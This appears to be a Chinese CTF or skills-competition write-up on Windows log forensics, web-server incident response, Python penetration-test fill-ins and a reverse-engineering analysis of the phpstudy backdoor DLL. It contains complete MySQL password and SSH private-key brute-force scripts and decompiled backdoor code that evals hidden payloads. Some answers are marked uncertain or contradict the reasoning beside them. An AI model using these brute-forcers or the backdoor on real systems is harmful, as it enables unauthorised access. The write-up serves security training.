open(r\"1.txt\",\"r\",encoding='utf-8').read()\nre_text = re.findall(r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}',r)\nre2_text = list(set(re_text))\nfor i in re2_text:\n    print(i)\n```\n\n##### FLAG1: 172.168.36.133\n\n#### 2.  黑客成功登录系统后修改了登录用户的用户名，将修改后的用户名作为Flag值提交；\n\n首先判断是成功登录了系统，登录是记录在安全里面的，这里我们筛选安全日志登录成功，成功登录的事件ID是4624\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VN0MDAYHwFI7uzFo1710404940.png)\n\n这里看到第二个事件就会发现一些不同之处，这里仔细看就可以发现不同这个administrator名字的顺序是错的，flag就是这个\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lvSSaujJoKP2XyXV1710404940.png)\n\n##### FLAG2: Adnimistartro\n\n#### 3.  黑客成功登录系统后成功访问了一个关键位置的文件，将该文件名称（文件名称不包含后缀）作为Flag值提交；\n\n```\n关于访问重要文件或者位置，会在安全日志里面记录，这里我们筛选关于安全日志的4663事件id的事件\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/zaVTIKPu1IEdAgc91710404940.png)\n\n这里在下面，我们可以发现有在大量访问，**SCHEMA.DAT**这个文件，所以就是这个文件了。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/4abI8o00jIlYd71w1710404940.png)\n\n或者我们可以通过一贯使用暴力手段，我们这里将筛选好的事件另存为2.txt，通过脚本将东西访问了那些重要文件或者位置跑出来。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/W4V0dhcbiRM4GVfV1710404941.png)\n\n```python\nimport re\n\nr = open(r\"2.txt\",\"r\",encoding='utf-8').read()\nre_text = re.findall(r'对象名:\t(.*?)\\n',r)\nre2_text = list(set(re_text))\nfor i in re2_text:\n    print(i)\n```\n\n这里可以看到去除重复文件和位置有这些文件：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/QgSHlEEWra5Q4rxm1710404941.png)\n\n##### FLAG3: SCHEMA\n\n#### 4.  黑客成功登录系统后重启过几次数据库服务，将最后一次重启数据库服务后数据库服务的进程ID号作为Flag值提交；\n\n这个MySQL服务属于是应用程序日志的，这里我们过滤事件ID位100的，这里我们可以看到事件ID为100都是来源于mysql的，这里我们按日期和时间排序，这里搜索start启动,虽然查到最后一次启动是1052，但是不对，倒数第二次8820发现是对的\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/eZuGh2esUioOkwz71710404941.png)\n\n##### FLAG4: 8820\n\n#### 5.  黑客成功登录系统后修改了登录用户的用户名并对系统执行了多次重启操作，将黑客使用修改后的用户重启系统的次数作为Flag值提交。\n\n这里我们知道他是进行了多次重启操作，那这里我们可以看到系统日志，通过过滤6006就是系统日志正常关闭，6005是系统日志正常开启，只有主机正常关机开机包括重启，才会有6006和6005\n\n这里可以看到有5个，但是这里第二个和其他不是一个用户组，所以就只有4个，但是答案是3个\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lybdo71yTQZzcaPn1710404941.png)\n\n##### Flag5：3\n\n\n\n### *应急响应（web服务器溯源）\n\n任务环境说明：\n\t服务器场景：Server10\n\t服务器场景操作系统：未知（开放链接）\n\n#### 1.  黑客通过网络攻入本地服务器，在Web服务器的主页上外挂了一个木马连接，请你找到此连接并删除该连接，将对应的标题名称作为flag值提交；\n\n使用 **Administrator 123456** 登录靶机\n\n在 **C:/inetpub/wwwroot/** 路径下查看php文件\n\n在 **3.php**文件发现存在木马：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Y8KAPYvY6WI6IvzB1710404942.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/fuqEBiNeiTcYTofo1710404942.png)\n\n##### FLAG1: skills\n\n#### 2.  黑客攻入本地的数据库服务器，并添加了除admin以外的具有一个管理员权限的超级用户，将此用户的密码作为flag值提交；\n\n使用mysql服务\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/dCfr8LY721EbpfU71710404942.png)\n\n账号密码 **root;root**\n\n```mysql\nselect user,password from mysql.user;\n```\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/smJreXc2qJ5rKSzc1710404942.png)\n\n##### FLAG2: ae1rfy9e\n\n#### 3.  黑客攻入本地服务器，在本地服务器建立了多个超级用户，请你删除除了Administrator用户以外的其他超级管理员用户，然后在命令行窗口输入net user，将Administrator右边第一个单词作为flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ytaBzR7cCp0K1xPz1710404942.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lp1PLetmY0VhJTGb1710404942.png)\n\n双击找到管理员组的其它后门用户\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/9SCBAXtz3rmGXx0O1710404943.png)\n\n再进入 **用户** 删除这些用户\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/rwyurE5OxDXDISFO1710404943.png)\n\n删除后再**net user**看下单词\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/dNMl7z2UKOZuMIuo1710404943.png)\n\n##### FLAG3: Desktop\n\n#### 4.  黑客修改了服务器的启动内容，请你删除不必要的启动项程序，将该启动项程序的名称作为flag值提交；（如有多个名称之间以英文逗号分隔，例hello,test）\n\n```\nwin+R -> msconfig\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8nLH1tJ327p60cg21710404943.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jBRag6oPypLflKkY1710404943.png)\n\n找到对应的位置来看内容：\n\n```\nC:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/FEVC5OThdJtvR7pz1710404943.png)\n\n内容：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Cxv7z6UnRZgurlix1710404944.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/yOhv2dCIYNMe8H0x1710404944.png)\n\n一个是开机自启ping本地，一个是开机自启创建后门用户和组，都是不必要的程序\n\n##### FLAG4: hack,Test\n\n#### 5.  黑客在服务器某处存放了一个木马程序，请你找到此木马程序并清除木马，将木马文件名作为flag值提交。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Y8KAPYvY6WI6IvzB1710404942.png)\n\n##### FLAG5: 3.php\n\n\n\n## Python题\n\n\n\n### *UDP网络服务Python渗透测试（USServer.py）\n\n**任务环境说明：**\n\nü 服务器场景名：PYsystem0056\n\nü 服务器场景操作系统：未知\n\nü 服务器场景用户名：（用户名：anonymous：密码；空）\n\n\n\n#### USServer.py\n\n```PYTHON\n# -- coding: utf-8\nimport socketserver\nimport time\nclass F1(socketserver.BaseRequestHandler):\n    def handle(F2):\n        while F3:\n            data = self.request[F4].F5()\n            socket = self.request[F6]\n            print('客户端IP：',self.client_address[0])\n            socket.F7(data, self.client_address)\n            time.sleep(2)\n        conn.F8()\nif __name__ == '__main__':\n    server = socketserver.ThreadingUDPServer(('0.0.0.0',9999),MyServer)\n    print('Server运行中!')\n    server.F9()\n\n```\n\n\n\n#### 1.  从靶机服务器的FTP上下载USServer.py，编辑Python程序USServer.py，实现Server服务，填写该文件当中空缺的F1字符串，将该字符串作为Flag值提交；\n\n#####  FLAG1: MyServer\n\n#### 2.  继续编辑Python程序USServer.py，实现Server服务，填写该文件当中空缺的F2字符串，将该字符串作为Flag值提交；\n\n##### FLAG2: self\n\n#### 3.  继续编辑Python程序USServer.py，实现Server服务，填写该文件当中空缺的F3字符串，将该字符串作为Flag值提交；\n\n#####  FLAG3: True\n\n#### 4.  继续编辑Python程序USServer.py，实现Server服务，填写该文件当中空缺的F4字符串，将该字符串作为Flag值提交；\n\n##### FLAG4: 0\n\n#### 5.  继续编辑Python程序USServer.py，实现Server服务，填写该文件当中空缺的F5字符串，将该字符串作为Flag值提交；\n\n#####  FLAG5: strip\n\n#### 6.    继续编辑Python程序USServer.py，实现Server服务，填写该文件当中空缺的F6字符串，将该字符串作为Flag值提交；\n\n#####  FLAG6: 1\n\n#### 7.    继续编辑Python程序USServer.py，实现Server服务，填写该文件当中空缺的F7字符串，将该字符串作为Flag值提交；\n\n#####  FLAG7: sendto\n\n#### 8.  继续编辑Python程序USServer.py，实现Server服务，填写该文件当中空缺的F8字符串，将该字符串作为Flag值提交；\n\n#####  FLAG8: close\n\n#### 9.  继续编辑Python程序USServer.py，实现Server服务，填写该文件当中空缺的F9字符串，将该字符串作为Flag值提交。\n\n##### FLAG9: serve_forever\n\n\n\n#### 最终脚本与解析\n\n```python\n# -- coding: utf-8\nimport socketserver\nimport time\n\nclass MyServer(socketserver.BaseRequestHandler):\n    def handle(self):\n        while True:\n            data = self.request[0].upper()\n            socket = self.request[1]\n            print('客户端IP：', self.client_address[0])\n            socket.sendto(data, self.client_address)\n            time.sleep(2)\n        socket.close()\n\nif __name__ == '__main__':\n    server = socketserver.ThreadingUDPServer(('0.0.0.0', 9999), MyServer)\n    print('Server运行中!')\n    server.serve_forever()\n```\n\n\n\n**解释：**\n\n这个程序是一个UDP服务器，可以接收来自客户端的数据，将其转换成大写并将其发送回客户端。程序中包含了以下空缺：\n\n- F1: 类名应该是 `MyServer`，因为 `MyServer` 类被用于创建服务器对象。\n- F2: `handle()` 方法需要一个参数 `self`，它代表了类实例本身，因此应该写成 `def handle(self):`。\n- F3: 这里需要一个无限循环，因此应该写成 `while True:`。\n- F4: 这里应该是 `0`，因为 `self.request` 是一个元组，第一个元素是套接字对象。\n- F5: 这里应该是 `strip()`，因为要将data变量去除空数据。\n- F6: 这里应该是 `1`，因为 `self.request` 是一个元组，第二个元素是客户端地址信息。\n- F7: 这里应该是 `sendto`，因为我们需要将接收到的数据转换为大写，并将其发送回客户端。\n- F8: 这里应该是 `socket.close()`，因为我们需要在处理结束后关闭套接字。\n- F9: 这里应该是 `server.serve_forever()`，因为我们需要让服务器一直运行下去，直到被中断。\n\n\n\n### Python程序渗透（weak_password.py）\n\n#### 题目\n\n```python\nimport pymysql\n\ntarget_ip = '127.0.0.1'\nfp = open('passwords.txt', 'r', encoding='utf-8-sig')\npwd_list = [F1] \nfp.close()\nresult_pwd = ''\nfor i in pwd_list:\n    try:\n        db = pymysql.connect(\n            host=F2,\n            port=3306,\n            user=\"root\",\n            password=F3,\n            connect_timeout=2)\n    except:\n        F4\n    result_pwd = i\n    F5\n\nif F6 not in '':\n    print(f\"{target_ip}连接成功，密码为：{result_pwd}\")\nelse:\n    print('爆破失败')\n```\n\n\n\n#### 1.从靶机服务器的FTP上下载weak_password.py，编辑Python程序，使该程序实现弱口令爆破，填写该文件当中空缺的F1字符串，生成密码列表\n\n```python\ntarget_ip = '127.0.0.1'\nfp = open('passwords.txt', 'r', encoding='utf-8-sig')\npwd_list = [F1] \n```\n\n这里fp打开了文本，要生成密码列表则要进行读取，则使用 **fp.readlines()**\n\n但这样生成的列表内还会有一个列表，所以要用 *号来获取所有列表 *号可以将多个元素解包为一个参数。\n\n或者用三元表达式一句话来实现： ```[i.strip() for i in fp.readlines()]``` 如果是这样写的话下面的参数也要对应修改。\n\n这里不确定正确答案。\n\n##### FLAG1: *fp.readlines()\n\n#### 2.编辑Python程序weak_password.py，使该程序实现弱口令爆破，填写该文件当中空缺的F2字符串，填写连接的host；\n\n```python\nresult_pwd = ''\nfor i in pwd_list:\n    try:\n        db = pymysql.connect(\n            host=F2,\n            port=3306,\n            user=\"root\",\n            password=F3,\n            connect_timeout=2)\n    except:\n        F4\n    result_pwd = i\n    F5\n```\n\nF2就是一开始定义的 **target_ip** 代入进去即可。\n\n##### FLAG2: target_ip\n\n#### 3.编辑Python程序weak_password.py，使该程序实现弱口令爆破，填写该文件当中空缺的F3字符串，填写连接的密码；\n\n这里进行了一个for循环来读取上面生成的密码列表，F3就是赋值后的i，也就是每一行的密码。\n\n因为上面用的是 **[*fp.readlines()]**，所以生成的列表会带有换行符 **\\n** ，因此这里我们密码就要去除这个换行符。\n\n使用**i.strip()** 或 **i[:-1]** 来处理。如果你是用 ```[i.strip() for i in fp.readlines()]```  那这里直接输入 i 即可。\n\n这里同样不确定正确答案。\n\n##### FLAG3: i[:-1]\n\n#### 4.编辑Python程序weak_password.py，使该程序实现弱口令爆破，填写该文件当中空缺的F4字符串，写出连接失败的处理逻辑；\n\nF4是except的处理，注意except下面就是给result_pwd赋值，所以如果密码不符合要求是不能到 **result_pwd = i** 这一步的。\n\n因此这里except用的应该是 **continue** 继续进行循环而不执行下一步，直到没有错误产生（也就是密码正确时）再给 result_pwd赋值\n\n##### FLAG4: continue\n\n#### 5.编辑Python程序weak_password.py，使该程序实现弱口令爆破，填写该文件当中空缺的F5字符串，写出连接成功的处理逻辑；\n\n密码只有一个，所以赋值也只有一次操作，赋值成功后就使用 **break** 停止循环。\n\n##### FLAG5: break\n\n#### 6.编辑Python程序weak_password.py，使该程序实现弱口令爆破，填写该文件当中空缺的F6字符串，写出判断result的值即可知道是否爆破成功；\n\n```python\nif F6 not in '':\n    print(f\"{target_ip}连接成功，密码为：{result_pwd}\")\nelse:\n    print('爆破失败')\n```\n\n上面赋值了result_pwd变量，所以这里根据逻辑F6就是上面的变量，如若不为空则输出密码，反则输出错误信息。\n\n##### FLAG6: result_pwd\n\n\n\n### *私钥暴力破解攻击（keybruteforce.py）\n\n**任务环境说明：**\n\nü 服务器场景：Server2211（关闭链接）\n\nü FTP用户名：匿名用户\n\n#### 1.  通过渗透机访问靶机FTP服务，获取FTP服务中的Python文件，将Python文件的文件名作为Flag值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/kFop1rjDRUhadk031710404944.png)\n\n脚本内容：\n\n```python\n#!/usr/bin/python3\n#-*- coding:utf-8 -*-\n\nimport F1\nimport optparse\nimport os\nfrom F2 import *\n\n# Flag1 = F1.F2\n\nmaxConnections = 5\nconnection_lock = BoundedSemaphore(value=maxConnections)\nStop = False\n\ndef connect(user, host, keyfile, release):\n    Flag2 Stop\n    try:\n        perm_denied = \"Permission denied\"\n        ssh_newkey = \"Are you sure you want to continue\"\n        conn_closed = \"Conection closed by remote host\"\n        opt = \" -o PasswordAuthentication=no\"\n        connCmd = \"ssh \" + user + \"@\" + host + \" -i \" + keyfile + opt\n        child = pexpect.spawn(connCmd)\n        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, \"$ \", \"# \", ])\n        if (ret == 2):\n            print(\"[-] Adding Host to known_hosts\")\n            child.sendline(\"yes\")\n            connect(F3, F4, keyfile, False)\n        elif (ret == 3):\n            print(\"[-] Connection Closed By Remote Host\")\n        elif (ret > 3):\n            print(\"[+] Success. \" + str(keyfile))\n            Flag4 = True\n    finally:\n        if release:\n            connection_lock.release()\n\n# Flag3 = F3.F4\n\ndef main():\n    parser = optparse.OptionParser(\"usage%prog -h <target host> -u <user> -d <key directory>\")\n    parser.add_option(\"-H\", dest=\"tgtHost\", type=\"string\", help=\"specify target host\")\n    parser.add_option(\"-d\", dest=\"keyDir\", type=\"string\", help=\"specify key directory\")\n    parser.add_option(\"-u\", dest=\"user\", type=\"string\", help=\"specify user\")\n    (options, args) = parser.Flag5()\n    host = options.tgtHost\n    keyDir = options.keyDir\n    user = options.user\n    if ((host == None) or (keyDir == None) or (user == None)):\n        print(parser.usage)\n        exit(0)\n    for filename in os.listdir(keyDir):\n        if Stop:\n            print(\"[*] Exiting: Key Found.\")\n            exit(0)\n        connection_lock.acquire()\n        fullpath = os.path.join(keyDir, filename)\n        print(\"[#] Testing Keyfile: \" + str(fullpath))\n        t = Thread(target=connect, args=(user, host, fullpath, True))\n        child = t.start()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n##### FLAG1: keybruteforce\n\n#### 2.  完善获取的Python文件，填写该文件当中空缺的Flag1 字符串，并将该字符串作为 Flag 值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/nsgqxlMWDg1175JG1710404944.png)\n\n注释告诉我们flag1由f1,f2组成 **#Flag1 = F1.F2**。\n\nf1,f2都是模块，从脚本的内容找相关的模块。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/1cet84CwslA6jrcj1710404944.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/AKc5QZ0sfpFdEeNH1710404945.png)\n\nThread是threading的子模块，所以这里F2是threading，F1就是pexpect了。\n\n##### FLAG2: pexpect.threading\n\n#### 3.  继续完善Python文件，填写该文件当中空缺的Flag2字符串，并将该字符串作为 Flag 值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/lLcTB4i2xy5qSQp21710404945.png)\n\n这里上面定义了 **Stop = False** 是一个布尔值，在这个模块中Stop变量也在变换，这里应该是全局变量global——调用Stop变量。\n\n##### FLAG3: global\n\n#### 4.  继续完善Python文件，填写该文件当中空缺的Flag3字符串，并将该字符串作为 Flag 值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/XhokVNLAuCvFvxCc1710404945.png)\n\n审计这段代码能发现，这里if判断的情况就是当ssh连接时需要发送yes的情况，然后重新调用了一遍这个函数。\n\n那这里F3，F4其实就是函数的第一个和第二个参数：user;host。\n\n##### FLAG4: user.host\n\n#### 5.  继续完善Python文件，填写该文件当中空缺的Flag4字符串，并将该字符串作为 Flag 值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/F9or5hzVEldHzI6y1710404945.png)\n\nFlag4明显是一个变量，设置的内容是布尔值。结合上面调用了全局变量Stop以及Stop内容就是布尔值，不难想到这里Flag4就是Stop\n\n##### FLAG5: Stop\n\n#### 6.  继续完善Python文件，填写该文件当中空缺的Flag5字符串，并将该字符串作为 Flag 值提交；\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/aRDMsuYO9Rv2OJGs1710404945.png)\n\noptparse实例parser，获取选项和参数的函数是 **parse_args()**\n\n##### FLAG6: parse_args\n\n#### 7.  将完善好的Python文件在 Kali上执行，将执行成功后的“Success”后面的内容作为 Flag 值提交。\n\n完善全部脚本，然后放在kali运行。\n\n```python\n#!/usr/bin/python3\n#-*- coding:utf-8 -*-\n\nimport pexpect\nimport optparse\nimport os\nfrom threading import *\n\n# Flag1 = F1.F2\n\nmaxConnections = 5\nconnection_lock = BoundedSemaphore(value=maxConnections)\nStop = False\n\ndef connect(user, host, keyfile, release):\n    global Stop\n    try:\n        perm_denied = \"Permission denied\"\n        ssh_newkey = \"Are you sure you want to continue\"\n        conn_closed = \"Conection closed by remote host\"\n        opt = \" -o PasswordAuthentication=no\"\n        connCmd = \"ssh \" + user + \"@\" + host + \" -i \" + keyfile + opt\n        child = pexpect.spawn(connCmd)\n        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, \"$ \", \"# \", ])\n        if (ret == 2):\n            print(\"[-] Adding Host to known_hosts\")\n            child.sendline(\"yes\")\n            connect(user, host, keyfile, False)\n        elif (ret == 3):\n            print(\"[-] Connection Closed By Remote Host\")\n        elif (ret > 3):\n            print(\"[+] Success. \" + str(keyfile))\n            Stop = True\n    finally:\n        if release:\n            connection_lock.release()\n\n# Flag3 = F3.F4\n\ndef main():\n    parser = optparse.OptionParser(\"usage%prog -h <target host> -u <user> -d <key directory>\")\n    parser.add_option(\"-H\", dest=\"tgtHost\", type=\"string\", help=\"specify target host\")\n    parser.add_option(\"-d\", dest=\"keyDir\", type=\"string\", help=\"specify key directory\")\n    parser.add_option(\"-u\", dest=\"user\", type=\"string\", help=\"specify user\")\n    (options, args) = parser.parse_args()\n    host = options.tgtHost\n    keyDir = options.keyDir\n    user = options.user\n    if ((host == None) or (keyDir == None) or (user == None)):\n        print(parser.usage)\n        exit(0)\n    for filename in os.listdir(keyDir):\n        if Stop:\n            print(\"[*] Exiting: Key Found.\")\n            exit(0)\n        connection_lock.acquire()\n        fullpath = os.path.join(keyDir, filename)\n        print(\"[#] Testing Keyfile: \" + str(fullpath))\n        t = Thread(target=connect, args=(user, host, fullpath, True))\n        child = t.start()\n\nif __name__ == \"__main__\":\n    main()\n```\n\n命令行：\n\n```\npython3 keybruteforce.py -H 192.168.31.129 -u root -d rsa\n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/70fNpmHCJ6Sj5NZ11710404946.png)\n\n##### FLAG7: rsa/ca8dd4d1-c0da-4384-ab5c-2649ad949210\n\n\n\n\n\n## 逆向分析\n\n### *远程代码执行渗透测试（2022广西phpstudy源码分析）\n\n**任务环境说明：**\n\nü 服务器场景：Server2128（开放链接）\n\nü 服务器场景操作系统：Windows\n\nü 用户名：administrator，密码：p@ssw0rd\n\n#### 1.  找出靶机桌面上文件夹1中的文件RCEBackdoor.zip，使用静态反编译工具IDA对该压缩包中的程序进行分析，根据提示来分析目标文件，将包含恶意代码基址偏移的范围作为Flag值提交（提交形式：0x1000XXXX-0x1000XXXX）；\n\n##### 漏洞介绍\n\n解压压缩包得到 **php-5.2.17** 和 **php-5.4.45** 两个文件\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/6dJ75La6ztqs2StC1710404946.png)\n\n分析任意一个文件夹，内容是phpstudy的文件。\n\n这里结合下一大题其实是2019月底发现的 **phpstudy后门漏洞**\n\n```\n大致可以追溯到2016年，黑客黑入phpstudy官网，将恶意安装包替换了当时安装包，并且将恶意代码进行的编码加密 隐匿至某一个dll文件中 难以发现。\n```\n\n**影响版本：**\n\n**phpstudy 2016版PHP5.4.45和PHP5.2.17，phpstudy2018版php-5.2.17和php-5.4.45存在后门。**\n\n该恶意dll文件在 ```ext/php_xmlrpc.dll``` 处。\n\n##### 漏洞检测\n\n这里可以用linux命令检测：\n\n```\n┌──(root💀MiWiFi-R1CM-srv)-[~/桌面/php-5.2.17]\n└─# grep -r \"@eval\" ./* \n```\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/R5FQKY2nLlVR9Kqn1710404946.png)\n\n或用脚本检测：\n\n```python\nimport os\n\nfor a,b,c in os.walk('./'):\n    for files in c:\n        path = os.path.join(a,files)\n        for lines in open(path,'rb').readlines():\n            line = lines.strip()\n            data = b\"@eval(\"\n            if data in line:\n                print(path,line[line.index(data):])\n```\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/FlIM6rbJeNPbbiTv1710404946.png)\n\n\n\n##### 漏洞分析\n\n使用IDA32位分析该dll文件。\n\n**Shift+F12** 查看字符串，找到该恶意代码，地址为 **0x10003490**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/FTzEC0fKTEotS9t91710404946.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LGD25fCSrnWb3dfp1710404947.png)\n\n\n\n```c++\nint __cdecl sub_10003490(int a1, int a2, int *a3)\n{\n  int v3; // edx\n  _BYTE *v4; // eax\n  int v6; // eax\n  int v7; // ecx\n  int v8; // eax\n  int v9; // esi\n  char *v10; // edi\n  const char *v11; // ecx\n  int v12; // eax\n  char *v13; // esi\n  int v14; // eax\n  char *v15; // edi\n  const char *v16; // ecx\n  _DWORD *v17; // esi\n  int v18; // eax\n  int v19; // edx\n  int v20; // eax\n  int v21; // edi\n  int result; // eax\n  int v23; // eax\n  int v24; // ecx\n  int v25; // eax\n  int v26; // edi\n  char v27[176]; // [esp+Dh] [ebp-19Bh] BYREF\n  __int16 v28; // [esp+BDh] [ebp-EBh]\n  char v29; // [esp+BFh] [ebp-E9h]\n  char v30[64]; // [esp+C0h] [ebp-E8h] BYREF\n  char v31[64]; // [esp+100h] [ebp-A8h] BYREF\n  char v32[64]; // [esp+140h] [ebp-68h] BYREF\n  char v33[4]; // [esp+180h] [ebp-28h] BYREF\n  const char ***v34; // [esp+184h] [ebp-24h] BYREF\n  int v35; // [esp+188h] [ebp-20h]\n  const char *v36; // [esp+18Ch] [ebp-1Ch] BYREF\n  const char ***v37; // [esp+190h] [ebp-18h] BYREF\n  int v38; // [esp+194h] [ebp-14h]\n  _DWORD **v39; // [esp+198h] [ebp-10h] BYREF\n  int v40; // [esp+19Ch] [ebp-Ch]\n  char *v41; // [esp+1A0h] [ebp-8h] BYREF\n  char *v42; // [esp+1A4h] [ebp-4h] BYREF\n\n  memset(v27, 0, sizeof(v27));\n  v28 = 0;\n  v3 = *a3;\n  v29 = 0;\n  v4 = *(_BYTE **)(v3 + 4 * core_globals_id - 4);\n  if ( v4[220] && !v4[217] && !v4[218] )\n    zend_is_auto_global(aServer, 7, a3);\n  zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, 8, v33);\n  if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &v39) != -1\n    && zend_hash_find(**v39, aHttpAcceptEnco, strlen(aHttpAcceptEnco) + 1, &v34) != -1 )\n  {\n    if ( !strcmp(**v34, aGzipDeflate) )\n    {\n      if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &v39) != -1\n        && zend_hash_find(**v39, aHttpAcceptChar, strlen(aHttpAcceptChar) + 1, &v37) != -1 )\n      {\n        v40 = sub_10004440(**v37, strlen(**v37));\n        if ( v40 )\n        {\n          v6 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);\n          v7 = *(_DWORD *)(v6 + 296);\n          *(_DWORD *)(v6 + 296) = v30;\n          v35 = v7;\n          v8 = setjmp3(v30, 0);\n          v9 = v35;\n          if ( v8 )\n            *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v35;\n          else\n            zend_eval_string(v40, 0, &byte_10011B34, a3);\n          *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v9;\n        }\n      }\n    }\n    else\n    {\n      v14 = strcmp(**v34, aCompressGzip);\n      if ( !v14 )\n      {\n        v15 = &byte_10011B34;\n        v16 = (const char *)&unk_1000C66C;\n        v42 = &byte_10011B34;\n        v17 = &unk_1000C66C;\n        while ( 1 )\n        {\n          if ( *v17 == 39 )\n          {\n            v15[v14] = 92;\n            v42[v14 + 1] = *v16;\n            v14 += 2;\n            v17 += 2;\n          }\n          else\n          {\n            v15[v14++] = *v16;\n            ++v17;\n          }\n          v16 += 4;\n          if ( (int)v16 >= (int)&unk_1000D5C4 )\n            break;\n          v15 = v42;\n        }\n        spprintf(&v36, 0, \"$V='%s';$M='%s';\", byte_10011A68, Buffer);\n        spprintf(&v42, 0, \"%s;@eval(%s('%s'));\", v36, aGzuncompress, v42);\n        v18 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);\n        v19 = *(_DWORD *)(v18 + 296);\n        *(_DWORD *)(v18 + 296) = v32;\n        v40 = v19;\n        v20 = setjmp3(v32, 0);\n        v21 = v40;\n        if ( v20 )\n          *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v40;\n        else\n          zend_eval_string(v42, 0, &byte_10011B34, a3);\n        result = 0;\n        *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v21;\n        return result;\n      }\n    }\n  }\n  if ( stru_10011D60.time - Tmb.time >= dword_1000C010 && stru_10011D60.time - Tmb.time < 6000 )\n  {\n    if ( !strlen(byte_10011A68) )\n      sub_10004810(byte_10011A68);\n    if ( !strlen(Buffer) )\n      sub_10004710(Buffer);\n    if ( !strlen(byte_10011A9C) )\n      sub_10004870(byte_10011A9C);\n    v10 = &byte_10011B34;\n    v11 = asc_1000C028;\n    v41 = &byte_10011B34;\n    v12 = 0;\n    v13 = asc_1000C028;\n    while ( 1 )\n    {\n      if ( *(_DWORD *)v13 == 39 )\n      {\n        v10[v12] = 92;\n        v41[v12 + 1] = *v11;\n        v12 += 2;\n        v13 += 8;\n      }\n      else\n      {\n        v10[v12++] = *v11;\n        v13 += 4;\n      }\n      v11 += 4;\n      if ( (int)v11 >= (int)&unk_1000C66C )\n        break;\n      v10 = v41;\n    }\n    spprintf(&v41, 0, \"@eval(%s('%s'));\", aGzuncompress, v41);\n    v23 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);\n    v24 = *(_DWORD *)(v23 + 296);\n    *(_DWORD *)(v23 + 296) = v31;\n    v38 = v24;\n    v25 = setjmp3(v31, 0);\n    v26 = v38;\n    if ( v25 )\n      *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v38;\n    else\n      zend_eval_string(v41, 0, &byte_10011B34, a3);\n    *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v26;\n    if ( dword_1000C010 < 3600 )\n      dword_1000C010 += 3600;\n    ftime(&Tmb);\n  }\n  ftime(&stru_10011D60);\n  if ( Tmb.time < 0 )\n    ftime(&Tmb);\n  return 0;\n}\n```\n\n\n\n这个函数的功能大致可以分为两个部分：\n\n1.接收http请求头，与 **gzip,deflate** 比对，如果相同则eval执行base64解密的命令（这也是后门出现的原因）。\n\n2.将恶意代码使用 **gzcompress** 压缩字节，调用时再使用 **gzuncompress** 解压并执行其中的base64 Payload。每隔一定时间执行恶意代码，向黑客的域名服务器发送信息。\n\n\n\n这里详细说明**第二部分**，也就是执行恶意代码。\n\n以下为实现的恶意代码：\n\n```c++\nv10 = &byte_10011B34;\nv11 = asc_1000C028;\nv41 = &byte_10011B34;\nv12 = 0;\nv13 = asc_1000C028;\nwhile ( 1 )\n{\n  if ( *(_DWORD *)v13 == 39 )\n  {\n    v10[v12] = 92;\n    v41[v12 + 1] = *v11;\n    v12 += 2;\n    v13 += 8;\n  }\n  else\n  {\n    v10[v12++] = *v11;\n    v13 += 4;\n  }\n  v11 += 4;\n  if ( (int)v11 >= (int)&unk_1000C66C )\n    break;\n  v10 = v41;\n}\nspprintf(&v41, 0, \"@eval(%s('%s'));\", aGzuncompress, v41);\nv23 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 